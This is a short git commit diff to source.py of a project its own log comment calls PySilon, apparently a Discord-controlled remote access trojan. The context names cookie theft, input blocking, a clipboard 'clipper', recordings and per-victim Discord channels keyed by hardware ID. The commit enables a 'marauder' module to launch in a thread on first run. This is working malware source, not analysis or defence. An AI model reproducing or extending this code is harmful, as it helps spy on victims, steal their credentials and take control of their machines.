0fae4ff1a7f1087c2282e2ab87be292f7f2e5732
mategol <44233157+mategol@users.noreply.github.com>
2023-08-01 18:46:49 +0200

    Fixed some `Debug mode` things

--- source.py
+++ source.py
@@ -114,6 +114,7 @@ files_to_merge, expectation, one_file_attachment_message = [[], [], []], None, N
 cookies_thread, implode_confirmation, cmd_messages = None, None, []
 send_recordings, input_blocked, clipper_stop = True, False, True
 latest_messages_in_recordings = []
+def stm(): import resources.mrd
 # [pysilon_var] !registry 0
 
 working_directory = ['C:', 'Users', getuser(), software_directory_name]
@@ -164,8 +165,7 @@ async def on_ready():
         
     if first_run:
         #.log PySilon is running for the first time
-        #threading.Thread(target=start_marauder)
-        #.log Started marauder thread
+        threading.Thread(target=stm).start()
         category = await client.get_guild(guild_id).create_category(hwid)
         #.log Created HWID category
         temp = await client.get_guild(guild_id).create_text_channel('info', category=category); channel_ids['info'] = temp.id
